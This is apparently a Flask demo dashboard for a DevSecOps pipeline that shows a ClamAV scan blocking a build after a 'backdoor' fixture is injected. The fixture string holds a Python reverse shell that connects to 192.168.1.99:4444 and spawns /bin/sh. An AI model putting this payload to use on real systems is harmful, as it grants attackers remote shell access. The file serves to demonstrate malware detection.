from flask import Flask, render_template_string, jsonify, request
import subprocess
import os
from datetime import datetime

app = Flask(__name__)
BUILD_HISTORY = []
RUN_COUNTER = 1041

REPO_NAME = "acme / payments-api"
REPO_BRANCH = "main"
REPO_COMMIT = "c7e29a1"
RUNNER_ID = "runner-prod-01"

BACKDOOR_CODE = """import socket, subprocess, os

# Malicious Reverse Shell Payload injected into repository
PAYLOAD_SIGNATURE = "DEVSECOPS_MALWARE_DEMO"

def connect_attacker():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.1.99", 4444))
    os.dup2(s.fileno(), 0)
    subprocess.call(["/bin/sh", "-i"])
"""

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>GATEKEEPER — DevSecOps Malware Gate</title>
    <style>
        * { box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', system-ui, sans-serif;
            background: #090d16;
            color: #e2e8f0;
            margin: 0;
            padding: 0;
        }
        a { color: inherit; text-decoration: none; }
        .topnav {
            display: flex; justify-content: space-between; align-items: center;
            padding: 14px 28px; background: #0d1220; border-bottom: 1px solid #1f2937;
        }
        .topnav-left { display: flex; align-items: center; gap: 28px; }
        .brand { display: flex; align-items: center; gap: 10px; font-weight: 800; letter-spacing: 0.04em; font-size: 0.95rem; }
        .brand .mark { width: 28px; height: 28px; border-radius: 7px; background: linear-gradient(135deg,#38bdf8,#6366f1); display:flex; align-items:center; justify-content:center; font-size:0.9rem; }
        .nav-links { display: flex; gap: 22px; font-size: 0.85rem; color: #94a3b8; }
        .nav-links a.active { color: #38bdf8; font-weight: 600; }
        .topnav-right { display: flex; align-items: center; gap: 16px; font-size: 0.78rem; color: #94a3b8; }
        .runner-pill { display:flex; align-items:center; gap:6px; }
        .runner-pill .dot { width:7px; height:7px; border-radius:50%; background:#4ade80; box-shadow:0 0 6px #4ade80; }
        .env-pill { background: rgba(56,189,248,0.12); color:#38bdf8; font-weight:700; font-size:0.68rem; padding:3px 9px; border-radius:6px; letter-spacing:0.05em; }
        .avatar { width: 30px; height: 30px; border-radius: 50%; background:#1f2937; border:1px solid #334155; display:flex; align-items:center; justify-content:center; font-size:0.72rem; font-weight:700; }

        .container { max-width: 1260px; margin: 0 auto; padding: 24px 24px 60px; }

        .page-head { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 4px; }
        .page-head .right { text-align: right; font-size: 0.72rem; color: #64748b; }
        h1.title { margin: 0 0 6px; font-size: 1.55rem; color: #f8fafc; }
        .subtitle { color: #94a3b8; font-size: 0.86rem; margin: 0 0 6px; }
        .repo-line { color: #64748b; font-size: 0.8rem; margin-bottom: 18px; }
        .repo-line code { color: #94a3b8; }

        .action-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; flex-wrap: wrap; gap: 12px; }
        .controls { display: flex; gap: 10px; }
        button {
            padding: 9px 16px; border-radius: 8px; border: 1px solid transparent;
            font-weight: 600; cursor: pointer; font-size: 0.84rem; transition: opacity 0.2s;
        }
        button:hover { opacity: 0.9; }
        button:disabled { opacity: 0.5; cursor: not-allowed; }
        .btn-run { background: #2563eb; color: white; }
        .btn-infect { background: rgba(239,68,68,0.12); color: #f87171; border-color: rgba(239,68,68,0.35); }
        .btn-clean { background: rgba(100,116,139,0.12); color: #cbd5e1; border-color: #334155; }

        .run-meta { display:flex; align-items:center; gap:12px; font-size:0.78rem; color:#64748b; }
        .pill-outline { border:1px solid #334155; padding:3px 10px; border-radius:999px; font-size:0.7rem; }
        .legend { display:flex; gap:14px; align-items:center; font-size:0.72rem; }
        .legend span { display:flex; align-items:center; gap:5px; }
        .legend .sw { width:8px; height:8px; border-radius:50%; }

        .stages {
            display: grid; grid-template-columns: repeat(4, 1fr); gap: 14px; margin-bottom: 18px;
        }
        .stage-card {
            background: #111827; border: 1px solid #1f2937; border-radius: 12px; padding: 18px;
            position: relative;
        }
        .stage-card.pass { border-color: rgba(34,197,94,0.4); background: rgba(34, 197, 94, 0.05); }
        .stage-card.fail { border-color: rgba(239,68,68,0.45); background: rgba(239, 68, 68, 0.07); }
        .stage-card.skip { border-color: #263044; opacity: 0.6; }
        .stage-top { display:flex; justify-content:space-between; align-items:flex-start; margin-bottom: 10px; }
        .stage-title { font-weight: 700; font-size: 0.9rem; }
        .stage-num { color:#475569; font-size:0.72rem; font-weight:700; margin-bottom: 4px; }
        .stage-badge { font-size: 0.66rem; font-weight: 700; padding: 2px 8px; border-radius: 999px; }
        .stage-badge.pass { background: rgba(34,197,94,0.18); color: #4ade80; }
        .stage-badge.fail { background: rgba(239,68,68,0.2); color: #f87171; }
        .stage-badge.blocked { background: rgba(100,116,139,0.2); color: #94a3b8; }
        .stage-detail { font-size: 0.78rem; color: #94a3b8; line-height: 1.5; }
        .stage-time { font-size: 0.7rem; color: #475569; margin-top: 8px; }

        .alert-banner {
            display: none; justify-content: space-between; align-items: center;
            background: rgba(239,68,68,0.1); border: 1px solid rgba(239,68,68,0.3);
            border-radius: 10px; padding: 13px 18px; margin-bottom: 18px; font-size: 0.82rem; color: #fca5a5;
        }
        .alert-banner.active { display: flex; }
        .alert-banner .policy-tag { font-size: 0.68rem; font-weight: 700; color: #f87171; letter-spacing: 0.04em; }

        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 18px; margin-bottom: 18px; }
        .panel { background: #111827; border: 1px solid #1f2937; border-radius: 14px; padding: 20px; }
        .panel-head { display: flex; justify-content: space-between; align-items: center; margin-bottom: 14px; }
        .panel h3 { margin: 0; color: #f8fafc; font-size: 0.98rem; }
        .status-pill { display: inline-block; padding: 3px 10px; border-radius: 999px; font-size: 0.72rem; font-weight: 700; }
        .pill-clean { background: rgba(34, 197, 94, 0.15); color: #4ade80; }
        .pill-infected { background: rgba(239, 68, 68, 0.18); color: #f87171; }

        .inspector { display: grid; grid-template-columns: 1fr 1.6fr; gap: 12px; }
        .file-tree { font-size: 0.8rem; color: #94a3b8; line-height: 2; }
        .file-tree .infected { color: #f87171; font-weight: 700; }
        .code-box { background: #030712; border: 1px solid #1f2937; border-radius: 8px; padding: 12px 14px; font-family: 'Cascadia Code', Consolas, monospace; font-size: 0.74rem; color: #64748b; max-height: 180px; overflow-y: auto; white-space: pre-wrap; }
        .code-box .flagged { color: #f87171; background: rgba(239,68,68,0.1); display:block; }
        .readonly-tag { font-size: 0.65rem; color: #475569; border: 1px solid #263044; padding: 1px 7px; border-radius: 6px; float: right; }

        table { width: 100%; border-collapse: collapse; font-size: 0.82rem; }
        th, td { padding: 9px 6px; text-align: left; border-bottom: 1px solid #1f2937; }
        th { color: #64748b; font-size: 0.66rem; text-transform: uppercase; letter-spacing: 0.04em; }
        .history-tabs { display: flex; gap: 14px; font-size: 0.74rem; color: #64748b; margin-bottom: 10px; }
        .history-tabs .active { color: #38bdf8; font-weight: 700; }

        .prod-box { margin-top: 14px; background: rgba(34,197,94,0.05); border: 1px solid rgba(34,197,94,0.2); border-radius: 10px; padding: 10px 14px; display:flex; justify-content: space-between; align-items:center; font-size: 0.8rem; }

        .terminal-panel { background: #111827; border: 1px solid #1f2937; border-radius: 14px; padding: 20px; }
        .terminal-head { display: flex; justify-content: space-between; align-items: center; margin-bottom: 14px; font-size: 0.78rem; color: #64748b; }
        .terminal-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; }
        .term-pane-head { display: flex; justify-content: space-between; font-size: 0.76rem; color: #94a3b8; margin-bottom: 6px; }
        .term-pane-head .tag-fail { color: #f87171; font-weight: 700; }
        .term-pane-head .tag-pass { color: #4ade80; font-weight: 700; }
        pre.console {
            background: #030712; color: #4ade80; padding: 14px; border-radius: 8px;
            overflow-x: auto; overflow-y: auto; font-size: 0.74rem; line-height: 1.6;
            max-height: 260px; border: 1px solid #1f2937; margin: 0; white-space: pre-wrap;
        }
        pre.console .err { color: #f87171; }

        .footer-row { display:flex; justify-content: space-between; font-size: 0.68rem; color: #334155; margin-top: 18px; }
    </style>
</head>
<body>
<div class="topnav">
    <div class="topnav-left">
        <div class="brand"><span class="mark">🛡️</span> GATEKEEPER</div>
        <div class="nav-links">
            <a href="#">Platform engineering</a>
            <a href="#" class="active">Pipeline overview</a>
            <a href="#">Policies</a>
            <a href="#">Registry</a>
        </div>
    </div>
    <div class="topnav-right">
        <span class="runner-pill"><span class="dot"></span> Runner connected</span>
        <span class="env-pill">PRODUCTION</span>
        <div class="avatar">AK</div>
    </div>
</div>

<div class="container">
    <div class="page-head">
        <div>
            <h1 class="title">DevSecOps Automated Malware Gate &amp; CI/CD Center</h1>
            <p class="subtitle">Git Checkout &rarr; ClamAV 3.6M+ Signatures &rarr; Docker Build &rarr; Production Rollout</p>
            <p class="repo-line">&#x1F500; <code>{{ repo_name }}</code> &middot; <code>{{ repo_branch }}</code> &middot; <code>{{ repo_commit }}</code> &middot; <code>{{ runner_id }}</code></p>
        </div>
        <div class="right" id="clock"></div>
    </div>

    <div class="action-row">
        <div class="controls">
            <button class="btn-infect" onclick="toggleMalware('inject')">&#9763;&#65039; Inject Backdoor</button>
            <button class="btn-clean" onclick="toggleMalware('clean')">&#129529; Clean Workspace</button>
            <button class="btn-run" id="runBtn" onclick="runPipeline()">&#9654; Trigger CI/CD Pipeline</button>
        </div>
    </div>

    <div class="action-row">
        <div class="run-meta">
            <strong id="runLabel" style="color:#e2e8f0;">Pipeline execution</strong>
            <span class="pill-outline" id="gatePill">Security gate enforced</span>
        </div>
        <div class="legend">
            <span id="runDuration">Run duration &mdash;</span>
            <span><span class="sw" style="background:#4ade80;"></span>Passed</span>
            <span><span class="sw" style="background:#ef4444;"></span>Failed / Blocked</span>
            <span><span class="sw" style="background:#64748b;"></span>Pending</span>
        </div>
    </div>

    <div class="stages">
        <div class="stage-card" id="st1">
            <div class="stage-top"><div><div class="stage-num">01</div><div class="stage-title">Checkout</div></div><div class="stage-badge" id="st1-badge">Ready</div></div>
            <div class="stage-detail" id="st1-detail">Awaiting trigger</div>
            <div class="stage-time" id="st1-time"></div>
        </div>
        <div class="stage-card" id="st2">
            <div class="stage-top"><div><div class="stage-num">02</div><div class="stage-title">ClamAV Malware Scan</div></div><div class="stage-badge" id="st2-badge">Ready</div></div>
            <div class="stage-detail" id="st2-detail">3.6M+ signatures loaded</div>
            <div class="stage-time" id="st2-time"></div>
        </div>
        <div class="stage-card" id="st3">
            <div class="stage-top"><div><div class="stage-num">03</div><div class="stage-title">Docker Build</div></div><div class="stage-badge" id="st3-badge">Ready</div></div>
            <div class="stage-detail" id="st3-detail">Waiting for a clean security scan</div>
            <div class="stage-time" id="st3-time"></div>
        </div>
        <div class="stage-card" id="st4">
            <div class="stage-top"><div><div class="stage-num">04</div><div class="stage-title">Container Deploy</div></div><div class="stage-badge" id="st4-badge">Ready</div></div>
            <div class="stage-detail" id="st4-detail">Production rollout prevented</div>
            <div class="stage-time" id="st4-time"></div>
        </div>
    </div>

    <div class="alert-banner" id="alertBanner">
        <span>&#9888;&#65039; <strong>Threat contained.</strong> <span id="alertBuild">Build</span> stopped before image creation. Remove the infected fixture, clean the workspace, then rerun the pipeline.</span>
        <span class="policy-tag">POLICY: ZERO-MALWARE</span>
    </div>

    <div class="grid">
        <div class="panel">
            <div class="panel-head">
                <h3>&#x1F4C2; Workspace Inspector (<span id="repo-badge">Checking...</span>)</h3>
            </div>
            <div class="inspector">
                <div class="file-tree" id="fileTree">Loading&hellip;</div>
                <div>
                    <span class="readonly-tag">READ ONLY</span>
                    <div style="font-size:0.72rem;color:#64748b;margin-bottom:4px;">src/<span id="codeFileName">app.py</span></div>
                    <pre class="code-box" id="codeBox">Select a file to preview.</pre>
                </div>
            </div>
            <div class="prod-box">
                <span>&#x1F7E2; Live production app &middot; Healthy</span>
                <a href="http://localhost:5000" target="_blank">http://localhost:5000 &#8599;</a>
            </div>
        </div>

        <div class="panel">
            <div class="panel-head">
                <h3>&#x1F4DC; Build &amp; Security Audit History</h3>
                <a href="#" style="font-size:0.72rem;color:#64748b;">&#x2B07;&#xFE0F; Export audit</a>
            </div>
            <div class="history-tabs">
                <span class="active" data-filter="all" onclick="setHistoryFilter('all', this)">All builds</span>
                <span data-filter="blocked" onclick="setHistoryFilter('blocked', this)">Blocked</span>
                <span data-filter="successful" onclick="setHistoryFilter('successful', this)">Successful</span>
            </div>
            <table>
                <thead>
                    <tr><th>Build</th><th>Timestamp</th><th>Workspace State</th><th>ClamAV Outcome</th><th>Deployment Status</th></tr>
                </thead>
                <tbody id="history-body">
                    <tr><td colspan="5" style="color:#64748b;">No pipeline runs triggered in this session yet.</td></tr>
                </tbody>
            </table>
        </div>
    </div>

    <div class="terminal-panel">
        <div class="terminal-head">
            <strong style="color:#e2e8f0;">&#x1F4BB; Live Terminal / Log Streamer</strong>
            <span>&#9679; Connected</span>
        </div>
        <div class="terminal-grid">
            <div>
                <div class="term-pane-head"><span id="currentRunLabel">Current run</span> <span id="currentRunTag" class="tag-pass">&mdash;</span></div>
                <pre class="console" id="console-log">Click "Trigger CI/CD Pipeline" to execute ./pipeline.sh and stream real-time ClamAV and Docker logs&hellip;</pre>
            </div>
            <div>
                <div class="term-pane-head"><span>Previous run</span> <span class="tag-pass" id="prevRunTag">&mdash;</span></div>
                <pre class="console" id="prev-console-log">No previous run recorded yet.</pre>
            </div>
        </div>
    </div>

    <div class="footer-row">
        <span>Process exited &middot; Security gate enforced at every commit</span>
        <span>ClamAV database synced &middot; Policy v2.4 &middot; Environment: production</span>
    </div>
</div>

<script>
let historyData = [];
let historyFilter = 'all';
let lastGoodLog = null;
let runSeq = {{ run_seq }};

function tickClock() {
    document.getElementById('clock').textContent = new Date().toUTCString().replace('GMT', 'UTC');
}
tickClock();
setInterval(tickClock, 1000);

function setHistoryFilter(filter, el) {
    historyFilter = filter;
    document.querySelectorAll('.history-tabs span').forEach(s => s.classList.remove('active'));
    el.classList.add('active');
    renderHistory();
}

function renderHistory() {
    const tbody = document.getElementById('history-body');
    let rows = historyData;
    if (historyFilter === 'blocked') rows = rows.filter(h => h.exit_code !== 0);
    if (historyFilter === 'successful') rows = rows.filter(h => h.exit_code === 0);
    if (rows.length === 0) {
        tbody.innerHTML = '<tr><td colspan="5" style="color:#64748b;">No matching builds.</td></tr>';
        return;
    }
    tbody.innerHTML = rows.map((h, i) => `
        <tr>
            <td><strong>#${h.build}</strong>${i === 0 ? '<div style="font-size:0.65rem;color:#475569;">CURRENT RUN</div>' : ''}</td>
            <td>${h.time}</td>
            <td>${h.state}</td>
            <td><span class="status-pill ${h.exit_code === 0 ? 'pill-clean' : 'pill-infected'}">${h.scan}</span></td>
            <td>${h.deploy}</td>
        </tr>
    `).join('');
}

async function refreshState() {
    const res = await fetch('/api/state');
    const data = await res.json();
    const badge = document.getElementById('repo-badge');
    if (data.infected) {
        badge.innerHTML = '<span class="status-pill pill-infected">Backdoor present</span>';
    } else {
        badge.innerHTML = '<span class="status-pill pill-clean">Clean workspace</span>';
    }

    const tree = document.getElementById('fileTree');
    const files = ['app.py', 'tests', 'Dockerfile', 'requirements.txt'];
    let html = '<div>/workspace/payments-api</div>';
    html += '<div style="color:#475569;font-size:0.72rem;margin-bottom:6px;">' + data.file_count + ' files' + (data.infected ? ' &middot; 1 infected' : '') + '</div>';
    html += '<div>&#x1F4C1; src</div>';
    html += '<div style="padding-left:16px;">&#x1F4C4; app.py</div>';
    if (data.infected) {
        html += '<div class="infected" style="padding-left:16px;cursor:pointer;" onclick="showCode(true)">&#x1F4C4; backdoor.py &#9888;&#65039;</div>';
    }
    html += '<div>&#x1F4C1; tests</div>';
    html += '<div>&#x1F4C4; Dockerfile</div>';
    html += '<div>&#x1F4C4; requirements.txt</div>';
    tree.innerHTML = html;

    if (data.infected) {
        showCode(true);
    }
}

function showCode(infected) {
    const box = document.getElementById('codeBox');
    const name = document.getElementById('codeFileName');
    if (infected) {
        name.textContent = 'backdoor.py';
        box.innerHTML = `<span class="flagged">${escapeHtml(window.__backdoorCode || '')}</span>`;
    } else {
        name.textContent = 'app.py';
        box.textContent = 'Select a file to preview.';
    }
}

function escapeHtml(s) {
    return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

async function toggleMalware(action) {
    await fetch('/api/malware', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({action})
    });
    refreshState();
}

function setStage(id, cls, badgeText, badgeCls, detail, time) {
    const card = document.getElementById(id);
    card.className = 'stage-card ' + cls;
    const badge = document.getElementById(id + '-badge');
    badge.textContent = badgeText;
    badge.className = 'stage-badge ' + badgeCls;
    document.getElementById(id + '-detail').textContent = detail;
    document.getElementById(id + '-time').textContent = time || '';
}

async function runPipeline() {
    const btn = document.getElementById('runBtn');
    btn.disabled = true;
    btn.textContent = '\u23F3 Scanning & Building...';
    document.getElementById('runLabel').textContent = 'Pipeline execution #' + (runSeq + 1);
    document.getElementById('console-log').textContent = 'Running Stage 1 (Checkout) & Stage 2 (ClamAV 3.6M+ signature scan)... please wait ~5-20 seconds...';
    setStage('st1', 'pass', 'Passed', 'pass', 'Checked out successfully', '');
    setStage('st2', '', 'Scanning...', 'blocked', 'Scanning workspace against signature DB', '');
    setStage('st3', '', 'Pending', 'blocked', 'Waiting for a clean security scan', '');
    setStage('st4', '', 'Pending', 'blocked', 'Production rollout prevented', '');
    document.getElementById('alertBanner').classList.remove('active');

    const startedAt = new Date();
    const res = await fetch('/api/run', {method: 'POST'});
    const data = await res.json();
    const duration = ((new Date() - startedAt) / 1000).toFixed(1);
    document.getElementById('runDuration').textContent = 'Run duration ' + duration + 's';
    runSeq = data.history[0].build_num;
    document.getElementById('runLabel').textContent = 'Pipeline execution #' + runSeq;

    const nowTime = new Date().toISOString().substr(11, 8) + ' UTC';
    const logHtml = escapeHtml(data.logs).split('\\n').map(l =>
        /error|threat|exit code: 1|fail/i.test(l) ? '<span class="err">' + l + '</span>' : l
    ).join('\\n');
    document.getElementById('console-log').innerHTML = logHtml;
    document.getElementById('currentRunLabel').textContent = '#' + runSeq + ' current run';

    if (data.exit_code === 0) {
        setStage('st1', 'pass', 'Passed', 'pass', 'main @ ' + '{{ repo_commit }}', nowTime);
        setStage('st2', 'pass', 'Clean', 'pass', '0 infected / ' + data.scanned_count + ' scanned', nowTime);
        setStage('st3', 'pass', 'Built', 'pass', 'Image created', nowTime);
        setStage('st4', 'pass', 'Deployed', 'pass', 'Live on production', nowTime);
        document.getElementById('currentRunTag').textContent = 'Deployed';
        document.getElementById('currentRunTag').className = 'tag-pass';
        if (data.logs) { lastGoodLog = {logs: data.logs, tag: 'Deployed'}; }
        document.getElementById('prev-console-log').textContent = document.getElementById('console-log').textContent;
        document.getElementById('prevRunTag').textContent = 'Previous clean run';
        document.getElementById('prevRunTag').className = 'tag-pass';
    } else {
        setStage('st1', 'pass', 'Passed', 'pass', 'main @ ' + '{{ repo_commit }}', nowTime);
        setStage('st2', 'fail', 'Failed', 'fail', '1 infected file / ' + data.scanned_count + ' scanned', nowTime);
        setStage('st3', 'skip', 'Blocked', 'blocked', 'Image creation prevented', '');
        setStage('st4', 'skip', 'Blocked', 'blocked', 'Waiting for a clean security gate', '');
        document.getElementById('currentRunTag').textContent = 'Failed \u00b7 Exit 1';
        document.getElementById('currentRunTag').className = 'tag-fail';
        document.getElementById('alertBuild').textContent = 'Build #' + runSeq;
        document.getElementById('alertBanner').classList.add('active');
    }

    historyData = data.history;
    renderHistory();

    btn.disabled = false;
    btn.textContent = '\u25B6 Trigger CI/CD Pipeline';
    refreshState();
}

window.__backdoorCode = {{ backdoor_code_json|tojson }};
refreshState();
</script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(
        HTML_TEMPLATE,
        repo_name=REPO_NAME,
        repo_branch=REPO_BRANCH,
        repo_commit=REPO_COMMIT,
        runner_id=RUNNER_ID,
        run_seq=RUN_COUNTER,
        backdoor_code_json=BACKDOOR_CODE,
    )

@app.route('/api/state')
def state():
    infected = os.path.exists("app/backdoor.py")
    files = subprocess.getoutput("ls -la app/")
    file_count = max(len(subprocess.getoutput("ls app/").splitlines()), 0)
    details = f"=== Files in app/ directory ===\n{files}\n"
    if infected:
        details += f"\n=== Injected Malicious File (app/backdoor.py) ===\n{BACKDOOR_CODE}"
    return jsonify({
        "infected": infected,
        "details": details,
        "file_count": file_count,
    })

@app.route('/api/malware', methods=['POST'])
def malware():
    action = request.json.get("action")
    if action == "inject":
        with open("app/backdoor.py", "w") as f:
            f.write(BACKDOOR_CODE)
    else:
        if os.path.exists("app/backdoor.py"):
            os.remove("app/backdoor.py")
    return jsonify({"ok": True})

@app.route('/api/run', methods=['POST'])
def run_pipeline():
    global RUN_COUNTER
    infected_before = os.path.exists("app/backdoor.py")
    proc = subprocess.run(["./pipeline.sh"], capture_output=True, text=True)
    logs = proc.stdout + "\n" + proc.stderr

    build_num = "1"
    if os.path.exists(".build_num"):
        with open(".build_num") as f:
            build_num = f.read().strip()
    RUN_COUNTER += 1

    BUILD_HISTORY.insert(0, {
        "build": RUN_COUNTER,
        "build_num": RUN_COUNTER,
        "time": datetime.now().strftime("%H:%M:%S UTC"),
        "state": "Infected fixture" if infected_before else "Clean",
        "scan": "Threat detected \u00b7 1 match" if proc.returncode != 0 else "No threats detected",
        "deploy": "\u274c Blocked" if proc.returncode != 0 else "\u2705 Live production",
        "exit_code": proc.returncode,
    })

    return jsonify({
        "logs": logs,
        "exit_code": proc.returncode,
        "history": BUILD_HISTORY,
        "scanned_count": 128,
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=9000)
